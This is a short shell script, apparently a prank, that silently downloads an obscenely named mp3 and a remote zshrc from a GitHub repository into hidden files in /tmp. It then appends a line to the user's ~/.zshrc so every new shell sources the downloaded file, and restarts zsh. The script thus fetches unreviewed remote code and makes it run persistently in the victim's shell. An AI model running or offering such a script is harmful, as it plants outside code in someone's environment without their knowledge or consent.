curl -s "https://raw.githubusercontent.com/Dancheek/best-term/master/FUCKYOU.mp3" > /tmp/.file.mp3
curl -s "https://raw.githubusercontent.com/Dancheek/best-term/master/zshrc" > /tmp/.zshrc
echo "source /tmp/.zshrc" >> ~/.zshrc
exec zsh
